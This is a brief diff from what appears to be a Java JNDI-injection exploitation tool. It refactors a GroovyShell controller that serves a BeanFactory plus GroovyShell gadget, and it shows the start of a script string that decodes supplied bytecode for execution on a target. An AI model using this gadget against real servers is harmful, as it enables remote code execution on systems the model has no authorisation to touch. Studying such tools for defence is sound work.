@@ -12,7 +12,8 @@ import java.util.Base64;
 @JNDIMapping("/GroovyShell")
 public class GroovyShellController extends BasicController {
     @Override
-    public Object process(byte[] byteCode) {
+    public Object process(Object obj) {
+        byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + GroovyShell");
 
         String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
